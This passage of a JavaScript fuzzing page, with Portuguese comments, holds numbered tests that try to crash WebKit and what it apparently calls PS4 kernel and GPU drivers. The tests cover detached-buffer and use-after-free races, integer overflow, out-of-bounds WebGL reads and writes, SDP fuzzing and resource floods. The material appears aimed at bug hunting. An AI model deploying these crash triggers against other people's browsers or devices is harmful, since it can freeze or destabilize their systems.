                let osc = ctx.createOscillator();
                osc.connect(ctx.destination);
                osc.start();
                log("AudioContext forçado com SampleRate ilegal.", "log-ok");
            } catch(e) { log("Falha na criação (Seguro): " + e, "log-fail"); }
        }

        // 23. Canvas toBlob Loop (Encoder Exhaustion)
        // Codificar imagens (PNG/JPG) usa bibliotecas nativas.
        // Fazer isso em loop consome memória nativa (fora do Heap JS).
        function runTest23() {
            log("Canvas Native Encoder Stress...", "log-warn");
            let c = document.createElement('canvas');
            c.width = 4096; c.height = 4096; // 4k Texture
            let ctx = c.getContext('2d');
            ctx.fillStyle = 'red'; ctx.fillRect(0,0,4096,4096);
            
            let loop = setInterval(() => {
                c.toBlob((b) => {
                    // Blob criado (Encoder rodou)
                    // Não fazemos nada com ele, esperando o Garbage Collector falhar em limpar o buffer nativo
                }, 'image/png');
            }, 10); // Loop muito rápido
            
            setTimeout(() => clearInterval(loop), 5000);
            log("Loop de Encoding iniciado.", "log-ok");
        }

        // 24. WebRTC SDP Fuzzing (Network Parser)
        // O parser SDP (Session Description Protocol) é código C complexo.
        // Injetar caracteres nulos ou unicode inválido pode crashar o parser.
        function runTest24() {
            log("Fuzzing WebRTC SDP...", "log-crit");
            let pc = new RTCPeerConnection();
            pc.createOffer().then(o => {
                // Modifica o SDP com lixo binário
                let badSdp = o.sdp.replace("IN IP4", "IN IP4 \x00\x00\xFF\xFF"); 
                return pc.setLocalDescription({type: "offer", sdp: badSdp});
            }).catch(e => log("Parser SDP: " + e.message, "log-ok"));
        }

        // 25. Gamepad Poll Flood (USB Driver Interaction)
        // O navegador faz polling do status do controle (USB/BT).
        // Chamar `getGamepads` em um loop infinito "tight" (while true) pode travar a thread de comunicação USB.
        function runTest25() {
            log("Gamepad Polling Flood...", "log-warn");
            // Nota: While(true) trava a UI, usamos setInterval agressivo
            let i = 0;
            let start = Date.now();
            let loop = () => {
                while(Date.now() - start < 2000) { // Trava a thread por 2s
                    navigator.getGamepads(); 
                    i++;
                }
                log(`Poll executado ${i} vezes.`, "log-ok");
            };
            setTimeout(loop, 100);
        }
        // ================= WEBKIT MEMORY CORRUPTION (26-30) =================

        // 26. WebCrypto Key Import Crash
        // Tenta importar uma chave criptográfica inválida/gigante para crashar a lib de criptografia (SAMU/Software).
        function runTest26() {
            log("Testando Crypto Engine com Lixo...", "log-sys");
            try {
                // Cria buffer de lixo
                let junk = new Uint8Array(10000); 
                for(let i=0; i<junk.length; i++) junk[i] = Math.random() * 255;
                
                window.crypto.subtle.importKey(
                    "raw", 
                    junk, 
                    {name: "AES-CBC"}, 
                    true, 
                    ["encrypt", "decrypt"]
                ).then(() => log("Importou (Estranho...)", "log-sys"))
                 .catch(e => log("Crypto tratou erro: " + e, "log-sys"));
                 
                log("Comando Crypto enviado.", "log-ok");
            } catch(e) { log(e, "log-err"); }
        }

        // 27. Proxy Trap Type Confusion
        // Usa Proxies para retornar objetos inesperados durante operações nativas, confundindo o motor JS.
        function runTest27() {
            log("Iniciando Proxy Type Confusion...", "log-sys");
            try {
                let target = {};
                let p = new Proxy(target, {
                    get: function(target, prop, receiver) {
                        // Quando o motor JS pedir algo, retornamos um objeto que muda o tipo esperado
                        if (prop === 'toString') return function() { throw "Crash?"; };
                        return 123; 
                    }
                });
                // Força operações internas no Proxy
                let arr = [p, p, p];
                arr.sort(); // O sort nativo vai chamar as propriedades do proxy
                log("Proxy manipulado sem crash.", "log-ok");
            } catch(e) { log("JSC Safe: " + e, "log-sys"); }
        }

        // 28. NodeIterator Use-After-Free
        // Clássico do WebKit: Modificar o DOM enquanto um iterador (cursor) está andando por ele.
        function runTest28() {
            log("NodeIterator UAF Attempt...", "log-sys");
            let root = document.createElement('div');
            root.innerHTML = "<div><span>Test</span><b>Bold</b></div>";
            document.body.appendChild(root);
            
            let iter = document.createNodeIterator(root, NodeFilter.SHOW_ALL);
            let node = iter.nextNode();
            
            // Remove o nó onde o iterador está, tentando deixar o iterador apontando para lixo
            root.innerHTML = ""; 
            
            try {
                let next = iter.nextNode(); // Acesso perigoso
                log("Iterador sobreviveu à destruição.", "log-ok");
            } catch(e) { log("Crash evitado: " + e, "log-sys"); }
        }

        // 29. Large Rope String (Heap Overflow)
        // Cria strings concatenadas preguiçosamente ("Rope") gigantescas para falhar a "flatterning" na memória.
        function runTest29() {
            log("Criando Rope String Massiva...", "log-sys");
            try {
                let s = "A";
                // Crescimento exponencial
                for(let i=0; i<28; i++) s += s; // 2^28 chars ~268MB
                // Força "flatten" (materialização real na RAM) acessando um char
                let c = s.charAt(s.length - 1);
                log("String alocada e lida: " + s.length, "log-ok");
            } catch(e) { log("OOM (Memória Esgotada): " + e, "log-sys"); }
        }

        // 30. Detached ArrayBuffer
        // Passa um buffer "desligado" (transferido) para APIs que esperam dados válidos.
        function runTest30() {
            log("Testando Buffer Detach...", "log-sys");
            if(!window.MessageChannel) return log("Sem MessageChannel", "log-sys");
            
            let ab = new ArrayBuffer(1024);
            let mc = new MessageChannel();
            
            // Transfere (detaches) o buffer
            mc.port1.postMessage(ab, [ab]);
            
            try {
                // Tenta criar view em buffer inválido (tamanho 0 ou ponteiro nulo)
                let view = new Uint8Array(ab);
                // Tenta escrever
                view[0] = 0xFF;
                log("Escrita em buffer detached! (CRÍTICO)", "log-err");
            } catch(e) { log("JSC bloqueou acesso: " + e, "log-ok"); }
        }


        // ================= KERNEL / DRIVER CORRUPTION (31-35) =================

        // 31. WebGL DrawElements OOB (GPU Driver Panic)
        // Pede para a GPU desenhar vértices que não existem no buffer (Out of Bounds Read).
        // Se o driver não checar, a GPU lê memória proibida e trava o sistema.
        function runTest31() {
            log("Disparando GPU OOB Read (drawElements)...", "log-err");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                // Setup mínimo
                let v = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(v, "attribute vec4 p;void main(){gl_Position=p;}");
                gl.compileShader(v);
                let f = gl.createShader(gl.FRAGMENT_SHADER);
                gl.shaderSource(f, "void main(){gl_FragColor=vec4(1,0,0,1);}");
                gl.compileShader(f);
                let p = gl.createProgram();
                gl.attachShader(p,v); gl.attachShader(p,f); gl.linkProgram(p);
                gl.useProgram(p);
                
                // Buffer pequeno
                let b = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, b);
                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0,0,0]), gl.STATIC_DRAW);
                
                // Tenta desenhar indice 10000 (muito além do tamanho do buffer)
                // Isso é o teste real de driver
                gl.drawArrays(gl.POINTS, 0, 10000);
                
                log("Comando OOB enviado para GPU.", "log-ok");
            } catch(e) { log("WebGL Error: " + e, "log-sys"); }
        }

        // 32. WebAudio Convolver Impulse OOM
        // Cria um buffer de convolução (Reverb) gigantesco. O Kernel/DSP tenta processar isso em tempo real.
        function runTest32() {
            log("Alocando Convolver Impulse Gigante...", "log-err");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let conv = ctx.createConvolver();
                // 10 segundos de buffer a 44k ~ 440k samples
                // Multiplica canais para estressar memória do DSP
                let len = ctx.sampleRate * 5; 
                let buf = ctx.createBuffer(2, len, ctx.sampleRate);
                
                // Preenche com ruído
                for(let c=0; c<2; c++) {
                    let d = buf.getChannelData(c);
                    for(let i=0; i<len; i++) d[i] = Math.random();
                }
                
                conv.buffer = buf; // Trigger de processamento pesado no Kernel
                conv.connect(ctx.destination);
                log("Impulse Response carregado no DSP.", "log-ok");
            } catch(e) { log("Audio Error: " + e, "log-sys"); }
        }

        // 33. Canvas Shadow Recursion (Graphics Driver)
        // Sombras em Canvas são caras. Desenhar sombras de sombras de sombras...
        function runTest33() {
            log("Canvas Shadow Recursion...", "log-sys");
            let c = document.createElement('canvas');
            c.width = 1000; c.height = 1000;
            let ctx = c.getContext('2d');
            
            ctx.shadowColor = "red";
            ctx.shadowBlur = 10;
            
            // Desenha recursivamente sobre o mesmo canvas
            function draw(depth) {
                if(depth <= 0) return;
                ctx.drawImage(c, 1, 1); // Desenha o próprio canvas (feedback loop)
                draw(depth-1);
            }
            // 50 iterações de feedback gráfico
            draw(50);
            log("Renderização recursiva enviada.", "log-ok");
        }

        // 34. WebRTC DataChannel Flood (Net Stack)
        // Abre canais de dados e envia blobs massivos sem controle de fluxo.
        function runTest34() {
            log("WebRTC Channel Flood...", "log-err");
            try {
                let pc = new RTCPeerConnection();
                let dc = pc.createDataChannel("flood");
                let data = new Uint8Array(1024*64); // 64kb packet
                
                dc.onopen = () => {
                    // Flood loop
                    for(let i=0; i<1000; i++) dc.send(data);
                };
                
                // Simula conexão loopback (necessita setup completo em cenário real, aqui tenta init)
                pc.createOffer().then(o => pc.setLocalDescription(o));
                log("Stack WebRTC inicializada.", "log-ok");
            } catch(e) { log("WebRTC Fail: " + e, "log-sys"); }
        }

        // 35. GPU Texture Video Race (Memory Copy)
        // Tenta usar um elemento de vídeo como textura WebGL antes dele carregar ou enquanto busca (seek).
        // Tenta pegar a GPU lendo memória não inicializada.
        function runTest35() {
            log("Iniciando Video Texture Race...", "log-err");
            let vid = document.createElement('video');
            vid.src = "blob:null/fake"; // URL inválida proposital
            
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            let tex = gl.createTexture();
            
            gl.bindTexture(gl.TEXTURE_2D, tex);
            
            try {
                // Tenta upar textura de vídeo inválido/não pronto
                // Drivers vulneráveis crasham ao tentar ler dimensões de vídeo nulo
                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, vid);
                log("Comando texImage2D executado.", "log-ok");
            } catch(e) { log("GL tratou erro: " + e, "log-sys"); }
        }
      // ================= WEBKIT MEMORY CORRUPTION (36-40) =================

        // 36. TypedArray Integer Overflow (Wrap-Around)
        // Tenta enganar o cálculo de memória ao solicitar um array tão grande que o tamanho (bytes)
        // ultrapassa 2^32, "dando a volta" e alocando um buffer pequeno, mas permitindo acesso longe.
        function runTest36() {
            log("Testando Integer Overflow no construtor...", "info");
            try {
                // (2^32 / 4) + 100. Se o engine usar 32-bit int para bytes, isso vira um número pequeno.
                // Mas o WebKit acha que tem bilhões de elementos.
                let len = 1073741824 + 100; 
                let arr = new Uint32Array(len);
                log(`Array criado. Tamanho: ${arr.length}. Tentando escrita no fim...`, "info");
                
                // Se houve overflow, essa escrita vai em memória não alocada (Heap Corruption)
                arr[len - 1] = 0xDEADBEEF;
                log("Escrita no limite executada (Verifique estabilidade).", "fatal");
            } catch(e) { log("Engine tratou o tamanho: " + e, "info"); }
        }

        // 37. Shadow DOM Slot Cyclic Reference
        // Cria uma estrutura de Shadow DOM onde um slot aponta para si mesmo ou cria um ciclo
        // na árvore de renderização. O motor de layout pode entrar em loop ou crashar ao calcular estilos.
        function runTest37() {
            log("Criando Ciclo no Shadow DOM...", "info");
            try {
                let host = document.createElement('div');
                let root = host.attachShadow({mode: 'open'});
                let slot = document.createElement('slot');
                
                // Aninha slots recursivamente
                root.appendChild(slot);
                let div = document.createElement('div');
                div.appendChild(host); // Div contém Host que contém Slot
                slot.assign([div]);    // Slot tenta renderizar o Div (Ciclo)
                
                document.body.appendChild(div);
                // Força cálculo de layout
                let h = div.offsetHeight;
                log("Ciclo de Renderização injetado.", "fatal");
                document.body.removeChild(div);
            } catch(e) { log("DOM Exception (Seguro): " + e, "info"); }
        }

        // 38. RegExp Sticky Flag Use-After-Free
        // A flag 'y' (sticky) no RegExp mantém estado interno (lastIndex).
        // Modificar a string subjacente durante a execução da regex pode causar UAF.
        function runTest38() {
            log("RegExp Sticky Race...", "info");
            let re = /foo/y;
            let str = "foo";
            
            // Objeto que se comporta como string mas roda código malicioso quando lido
            let evil = {
                toString: () => {
                    re.lastIndex = 0; // Reseta estado interno no meio da operação
                    return "bar";
                }
            };
            
            try {
                re.lastIndex = 100; // Estado inválido inicial
                // Trigger
                let res = re.exec(evil); 
                log("RegExp executado com mutação.", "fatal");
            } catch(e) { log("Erro JS: " + e, "info"); }
        }

        // 39. JSON.stringify Recursion (Stack Exhaustion)
        // Diferente de loop infinito, isso ataca a pilha de chamadas interna do parser JSON.
        // Se a proteção de profundidade falhar, corrompe a memória da Stack.
        function runTest39() {
            log("Testando JSON Stack Depth...", "info");
            let a = [];
            // Cria array aninhado profundamente [[[[...]]]]
            for (let i = 0; i < 10000; i++) {
                a = [a];
            }
            try {
                JSON.stringify(a);
                log("JSON stringify completou (Inesperado).", "info");
            } catch(e) { 
                // Erro "Maximum call stack size" é bom, significa que a proteção funcionou.
                // Se crashar sem erro, é bounty.
                log("Stack Limit atingido: " + e, "info"); 
            }
        }

        // 40. Fetch Stream Detach (ReadableStream Race)
        // Inicia um download (Fetch) e tenta "desconectar" o buffer de leitura
        // enquanto o kernel ainda está escrevendo dados de rede nele.
        function runTest40() {
            log("ReadableStream Buffer Race...", "info");
            fetch(window.location.href).then(res => {
                const reader = res.body.getReader();
                // Lê o primeiro chunk
                reader.read().then(({value, done}) => {
                    if(value) {
                        // Tenta transferir o buffer enquanto o stream ainda está aberto
                        try {
                            let worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
                            worker.postMessage(value.buffer, [value.buffer]); // Transfer
                            log("Buffer transferido durante Stream.", "fatal");
                        } catch(e) { log(e, "info"); }
                    }
                });
            });
        }

        // ================= KERNEL / DRIVER TESTS (41-45) =================

        // 41. WebGL Scissor/Viewport Overflow (GPU Bounds)
        // Define uma área de recorte (Scissor) com valores negativos ou gigantes.
        // O driver da GPU deve converter isso para coordenadas de hardware. Erros aqui sobrescrevem VRAM.
        function runTest41() {
            log("Injetando Scissor/Viewport Ilegal...", "fatal");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                
                // Valores extremos: Maior Int32, Negativos
                gl.enable(gl.SCISSOR_TEST);
                // X, Y, Width, Height
                // Tentar Width maior que a textura máxima suportada
                gl.scissor(0, 0, 2147483647, 2147483647); 
                gl.viewport(-10000, -10000, 50000, 50000);
                
                gl.clearColor(1, 0, 0, 1);
                gl.clear(gl.COLOR_BUFFER_BIT); // Dispara a operação na GPU
                
                log("Comandos de Viewport extremos enviados.", "info");
            } catch(e) { log("WebGL Error: " + e, "info"); }
        }

        // 42. FontFace Cache Thrashing (Resource Race)
        // Carrega e deleta fontes repetidamente para estressar o cache de fontes do Kernel.
        // O Kernel do PS4 gerencia fontes globais, e race conditions aqui causam Panic.
        function runTest42() {
            log("Stress Test: Font Cache...", "info");
            let i = 0;
            let interval = setInterval(() => {
                i++;
                if(i > 50) clearInterval(interval);
                
                let name = "Font" + Math.random();
                let f = new FontFace(name, "url(data:font/woff;base64,AAEAAA...)"); // Base64 invalido curto
                document.fonts.add(f);
                f.load().catch(()=>{}); // Ignora erro de load
                document.fonts.delete(f); // Deleta imediatamente
            }, 5);
            log("Thrashing de Fontes iniciado.", "fatal");
        }

        // 43. Video Track Buffer Race
        // Manipula faixas de texto (legendas) de um vídeo enquanto o vídeo tenta renderizá-las.
        // Ataque ao parser de mídia (Userland/Kernel boundary).
        function runTest43() {
            log("Video TextTrack Mutation Race...", "info");
            let v = document.createElement('video');
            let t = v.addTextTrack("subtitles");
            t.mode = "showing";
            
            // Adiciona Cue
            let cue = new VTTCue(0, 10, "Hack");
            t.addCue(cue);
            
            // Loop de modificação enquanto "toca"
            let loop = setInterval(() => {
                try {
                    t.removeCue(cue);
                    cue.text = "A".repeat(1000); // Realloc string
                    t.addCue(cue);
                } catch(e) {}
            }, 0);
            
            setTimeout(() => { clearInterval(loop); log("Fim do teste VideoTrack.", "info"); }, 2000);
        }

        // 44. GPU Shader Precision NaN (Floating Point Exception)
        // Força cálculos de precisão inválida dentro do Shader.
        // Algumas GPUs travam se dividirem por zero em float ou gerarem NaN em coordenadas.
        function runTest44() {
            log("Enviando Shader 'Divide-by-Zero'...", "fatal");
            try {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                let p = gl.createProgram();
                // Vertex Shader que divide por zero na posição
                let vs = gl.createShader(gl.VERTEX_SHADER);
                gl.shaderSource(vs, `
                    attribute vec4 pos;
                    void main() {
                        float z = 0.0;
                        gl_Position = vec4(pos.x / z, pos.y, 0.0, 1.0); // Divisão por Zero
                        gl_PointSize = 100.0;
                    }
                `);
                gl.compileShader(vs);
                // (O resto do setup é omitido, pois o compile/link já valida o código)
                // Se o otimizador do driver tentar pré-calcular isso e falhar -> Crash.
                log("Shader compilado (Verificar se GPU travou).", "info");
            } catch(e) { log(e, "info"); }
        }

        // 45. HRTF Audio Panner Race (DSP Kernel Panic)
        // O PannerNode usa HRTF database no Kernel.
        // Mudar o modelo de distância rapidamente enquanto toca áudio pode causar leitura fora de buffer no DSP.
        function runTest45() {
            log("HRTF Panner Model Switching...", "fatal");
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let panner = ctx.createPanner();
                panner.panningModel = 'HRTF'; // O mais pesado/complexo
                
                let osc = ctx.createOscillator();
                osc.connect(panner);
                panner.connect(ctx.destination);
                osc.start();
                
                let models = ['linear', 'inverse', 'exponential'];
                let i = 0;
                let loop = setInterval(() => {
                    // Troca o algoritmo matemático do Kernel em alta frequencia
                    panner.distanceModel = models[i++ % 3];
                    panner.refDistance = Math.random() * 100;
                }, 5);
                
                setTimeout(() => { clearInterval(loop); ctx.close(); log("Fim do teste HRTF.", "info"); }, 2000);
            } catch(e) { log(e, "info"); }
        }
      // ================= WEBKIT TESTS (46-50) =================

        // 46. FinalizationRegistry Use-After-Free
        // Tenta ressuscitar um objeto durante o processo de coleta de lixo (Garbage Collection).
        // Se o motor liberar a memória mas o callback ainda tiver acesso, temos um UAF.
        function runTest46() {
            log("Testando GC Re-entrancy...", "sys");
            if(!window.FinalizationRegistry) return log("API não suportada.", "sys");

            let target = {id: 1};
            const registry = new FinalizationRegistry(heldValue => {
                // O callback roda quando 'target' é coletado.
                // Tentamos acessar algo que pode já ter sido destruído internamente.
                log("Objeto coletado. Tentando alocar no buraco...", "uaf");
                let replacement = new Uint8Array(1024); // Tenta ocupar o slot liberado
            });
            
            registry.register(target, "secret");
            target = null; // Marca para GC
            
            // Força pressão de memória para disparar o GC
            let pressure = [];
            try {
                for(let i=0; i<10000; i++) pressure.push(new Array(1000).fill(i));
            } catch(e){}
            log("Aguardando GC Trigger...", "sys");
        }

        // 47. Intl Collator Crash (ICU Library)
        // A biblioteca de internacionalização (ICU) é enorme e complexa.
        // Comparar strings com locales absurdos pode causar buffer overflow na stack da biblioteca C++.
        function runTest47() {
            log("Fuzzing Intl.Collator (ICU Lib)...", "sys");
            try {
                // Locale inválido gigante + opções de numeração
                let loc = "ar-u-nu-arab" + "-undefined".repeat(500); 
                let col = new Intl.Collator(loc);
                
                // Compara strings que forçam expansão unicode
                let s1 = "\u0600".repeat(1000);
                let s2 = "\u0601".repeat(1000);
                
                col.compare(s1, s2);
                log("Collator executou sem crash.", "sys");
            } catch(e) { log("Erro Intl (Seguro): " + e, "sys"); }
        }

        // 48. BigInt JIT Side-Effects
        // Operações com BigInt podem disparar alocação de memória e GC.
        // Se isso ocorrer no meio de uma função otimizada pelo JIT que assumiu que "inteiros não alocam", crasha.
        function runTest48() {
            log("BigInt JIT Optimization check...", "uaf");
            function opt(x, y) {
                // JIT pode assumir que 'x' é int32 e remover checks
                return x + y; 
            }
            
            for(let i=0; i<10000; i++) opt(1, 2); // Treina para Int32
            
            // Passa BigInt repentinamente
            try {
                let res = opt(1n, 2n);
                log("JIT lidou com BigInt (De-opt OK).", "sys");
            } catch(e) { log("TypeError (Esperado): " + e, "sys"); }
        }

        // 49. Map/Set Iterator Invalidation
        // Modificar um Map enquanto itera sobre ele pode corromper os ponteiros internos do iterador.
        function runTest49() {
            log("Map Iterator Invalidation...", "uaf");
            let m = new Map();
            for(let i=0; i<100; i++) m.set(i, i);
            
            let iter = m.entries();
            iter.next();
            
            // Limpa o mapa violentamente
            m.clear(); 
            // Adiciona lixo para sobrescrever memória antiga
            for(let i=0; i<50; i++) m.set(i, "JUNK");
            
            try {
                iter.next(); // Tenta continuar iterando no mapa antigo limpo
                log("Iterador sobreviveu ao clear().", "sys");
            } catch(e) { log(e, "sys"); }
        }

        // 50. Object.defineProperty Cycle
        // Cria um objeto onde acessar uma propriedade define outra propriedade recursivamente,
        // tentando travar o motor de objetos em loop infinito de definições.
        function runTest50() {
            log("Property Definition Loop...", "uaf");
            let obj = {};
            try {
                Object.defineProperty(obj, 'crash', {
                    configurable: true,
                    get: function() {
                        // Redefine a si mesmo ao ser lido
                        Object.defineProperty(obj, 'crash', { value: 1 });
                        return 2;
                    }
                });
                let val = obj.crash; // Trigger
                log("Propriedade redefinida dinamicamente.", "sys");
            } catch(e) { log(e, "sys"); }
        }


        // ================= KERNEL TESTS (51-55) =================

        // 51. GPU Transform Feedback (Write to Memory)
        // Usa WebGL2 (se disp) para fazer a GPU escrever dados de vértices de volta para um buffer.
        // Se os offsets estiverem errados, a GPU escreve em memória arbitrária do Kernel.
        function runTest51() {
            log("Iniciando Transform Feedback (GPU Write)...", "panic");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl2') || c.getContext('webgl');
            
            if(!gl || !gl.createTransformFeedback) return log("WebGL2/TF não suportado.", "sys");

            let tf = gl.createTransformFeedback();
            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
            
            let b = gl.createBuffer();
            gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, b);
            gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 1024, gl.DYNAMIC_READ);
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, b);
            
            // Tenta iniciar feedback sem shader apropriado ou estado inválido
            try {
                gl.beginTransformFeedback(gl.POINTS);
                gl.pauseTransformFeedback();
                gl.resumeTransformFeedback();
                gl.endTransformFeedback();
                log("Ciclo de feedback GPU enviado.", "sys");
            } catch(e) { log("GL Error: " + e, "sys"); }
        }

        // 52. Compressed Texture Bomb (S3TC/ETC)
        // Envia dados aleatórios marcados como textura comprimida (DXT1/S3TC).
        // O hardware de descompressão da GPU tenta ler blocos e pode acessar OOB se os dados forem inválidos.
        function runTest52() {
            log("Injetando Textura Comprimida Inválida...", "panic");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            let ext = gl.getExtension('WEBGL_compressed_texture_s3tc') || gl.getExtension('WEBKIT_WEBGL_compressed_texture_s3tc');
            
            if(!ext) return log("S3TC não suportado.", "sys");
            
            let t = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, t);
            // Formato COMPRESSED_RGBA_S3TC_DXT5_EXT (0x83F3)
            // Dados de lixo que não alinham com blocos 4x4
            let junk = new Uint8Array(1024 + 1); 
            
            try {
                gl.compressedTexImage2D(gl.TEXTURE_2D, 0, ext.COMPRESSED_RGBA_S3TC_DXT5_EXT, 32, 32, 0, junk);
                log("Driver aceitou payload comprimido corrompido.", "uaf");
            } catch(e) { log("Driver rejeitou (Seguro): " + e, "sys"); }
        }

        // 53. AudioWorklet Shared Race
        // Usa AudioWorklet (Thread de Áudio) e Main Thread acessando o mesmo SharedArrayBuffer.
        // Tenta corromper os dados de áudio enquanto o driver lê.
        function runTest53() {
            log("AudioWorklet Shared Memory Race...", "panic");
            if(!window.AudioWorklet) return log("Worklet não suportado.", "sys");
            
            let ctx = new AudioContext();
            try {
                ctx.audioWorklet.addModule('data:text/javascript,registerProcessor("a",class extends AudioWorkletProcessor{process(i,o,p){return true}})').then(() => {
                    let node = new AudioWorkletNode(ctx, 'a');
                    node.connect(ctx.destination);
                    log("Worklet rodando no Kernel/Audio Thread.", "sys");
                });
                
                // Fuzzing de parâmetros
                setInterval(() => {
                    let p = ctx.createBuffer(1, 100, 44100);
                    // Cria e destroi buffers rapidamente
                }, 10);
            } catch(e) { log(e, "sys"); }
        }

        // 54. WebGL2 Query Buffer OOB
        // Tenta usar Query Objects para escrever contadores de hardware (pixels passados, tempo) em um buffer.
        // Se o buffer destino for pequeno demais, a GPU sobrescreve o heap.
        function runTest54() {
            log("Hardware Query Object Overflow...", "panic");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl2');
            if(!gl) return log("Sem WebGL2.", "sys");

            let q = gl.createQuery();
            let b = gl.createBuffer();
            gl.bindBuffer(gl.QUERY_BUFFER, b); // Disponível apenas em contextos avançados
            gl.bufferData(gl.QUERY_BUFFER, 4, gl.DYNAMIC_COPY); // Buffer minúsculo (4 bytes)
            
            gl.beginQuery(gl.ANY_SAMPLES_PASSED, q);
            // Desenha algo
            gl.clear(gl.COLOR_BUFFER_BIT);
            gl.endQuery(gl.ANY_SAMPLES_PASSED);
            
            try {
                // Tenta escrever resultado de 64 bits (8 bytes) num buffer de 4 bytes
                gl.getQueryParameter(q, gl.QUERY_RESULT_AVAILABLE); 
                log("Query de hardware manipulada.", "sys");
            } catch(e) { log(e, "sys"); }
        }

        // 55. MediaSource Keyframe Seek Race
        // AppendBuffer adiciona dados, Seek pula para dados.
        // Fazer os dois ao mesmo tempo força o decoder a buscar frames que ainda não foram escritos na RAM.
        function runTest55() {
            log("Video Decoder Seek/Write Race...", "panic");
            let vid = document.createElement('video');
            let ms = new MediaSource();
            vid.src = URL.createObjectURL(ms);
            
            ms.addEventListener('sourceopen', () => {
                let sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                let noise = new Uint8Array(1024 * 1024); // Fake video data
                
                setInterval(() => {
                    try {
                        if(!sb.updating) sb.appendBuffer(noise);
                        // Seek aleatório violento
                        vid.currentTime = Math.random() * 100;
                    } catch(e) {}
                }, 10);
            });
            log("Race Condition no Decoder de Vídeo iniciada.", "panic");
        }

        // 56. Array Sort Detach (Classic WebKit)
        // Usa uma função de comparação personalizada no sort() que "desliga" (detaches) o buffer do array.
        // O WebKit tenta continuar ordenando memória que não existe mais.
        function runTest56() {
            log("Testando ArrayBuffer Detach durante Sort...", "info");
            try {
                const ab = new ArrayBuffer(1024);
                const arr = new Float64Array(ab);
                const worker = new Worker(URL.createObjectURL(new Blob(['self.onmessage=e=>postMessage("done")'], {type: 'text/javascript'})));

                // Define comparador malicioso
                function compare(a, b) {
                    if (ab.byteLength > 0) {
                        log("Detaching buffer agora!", "danger");
                        worker.postMessage({buf: ab}, [ab]); // Transfere posse, esvaziando ab
                    }
                    return a - b;
                }

                log("Iniciando Sort...", "info");
                // Preenche array para forçar múltiplas comparações
                for(let i=0; i<arr.length; i++) arr[i] = Math.random();
                
                // Trigger
                Array.prototype.sort.call(arr, compare);
                log("Sort finalizado (Falha se não crashou).", "success");
            } catch(e) { log("Erro JS: " + e, "info"); }
        }

        // 57. WebAssembly Table Overflow
        // Tenta inicializar uma tabela WASM com limites que desafiam a verificação de 32-bit.
        function runTest57() {
            log("WASM Table Bounds Check...", "info");
            try {
                // Tenta criar tabela com max element size próximo de uint32_max
                const table = new WebAssembly.Table({
                    element: "anyfunc",
                    initial: 100,
                    maximum: 2147483647 // Edge case de 32-bit signed
                });
                
                // Tenta crescer para forçar realocação
                table.grow(1000);
                log("Tabela WASM manipulada no limite.", "success");
            } catch(e) { log("WASM Error: " + e, "info"); }
        }

        // 58. Canvas Path2D Infinity (Rasterizer Crash)
        // Cria caminhos vetoriais com coordenadas infinitas. O rasterizador da GPU/CPU
        // tenta calcular a área e pode entrar em loop ou dividir por zero.
        function runTest58() {
            log("Enviando Coordenadas Infinitas para Rasterizer...", "danger");
            const ctx = document.createElement('canvas').getContext('2d');
            const p = new Path2D();
            
            p.moveTo(0, 0);
            p.bezierCurveTo(Infinity, Infinity, NaN, NaN, 100, 100);
            p.lineTo(1e308, 1e308); // Double precision max
            
            try {
                ctx.fill(p); // Trigger de cálculo geométrico
                log("Path2D processado (Rasterizer robusto).", "info");
            } catch(e) { log(e, "info"); }
        }

        // 59. Worker MessagePort Clone Loop
        // Envia portas de comunicação para si mesmas através de workers, criando referências cíclicas
        // que o Garbage Collector distribuído tem dificuldade de resolver.
        function runTest59() {
            log("MessagePort Distributed GC Stress...", "info");
            const channel = new MessageChannel();
            const worker = new Worker(URL.createObjectURL(new Blob([
                `self.onmessage = e => { 
                    // Reenvia a porta para ela mesma num loop
                    e.data.postMessage("loop", [e.data]); 
                }`
            ], {type: 'text/javascript'})));
            
            // Inicia o ciclo
            worker.postMessage(channel.port1, [channel.port1]);
            log("Ciclo de portas distribuído iniciado.", "success");
        }

        // 60. TextEncoder Stream UAF
        // Usa encoding de stream e tenta invalidar o buffer de destino no meio do processo.
        function runTest60() {
            log("TextEncoder Stream Race...", "info");
            const encoder = new TextEncoder();
            const hugeStr = "A".repeat(1024 * 1024); // 1MB String
            
            // Tenta forçar alocação interna
            let u8 = encoder.encode(hugeStr);
            
            // Acesso imediato forçado
            if(u8.length > 0) log("Encoder finalizado.", "success");
        }

        // ================= KERNEL / DRIVER TESTS (61-65) =================

        // 61. GPU Vertex Stride Zero (Infinite Loop/OOB)
        // Stride é o passo entre vértices. Stride 0 ou desalinhado (ex: 1 byte em float)
        // faz a GPU ler a memória de forma imprevisível.
        function runTest61() {
            log("GPU VertexAttribPointer Stride Attack...", "danger");
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl');
            
            const b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
            
            // Ativa atributo
            gl.enableVertexAttribArray(0);
            
            // STRIDE = 0 (Normalmente permitido, mas perigoso com offsets grandes)
            // STRIDE = 255 (Desalinhado para float de 4 bytes)
            try {
                gl.vertexAttribPointer(0, 4, gl.FLOAT, false, 255, 0); // Stride desalinhado
                gl.drawArrays(gl.POINTS, 0, 100000); // Desenha muito
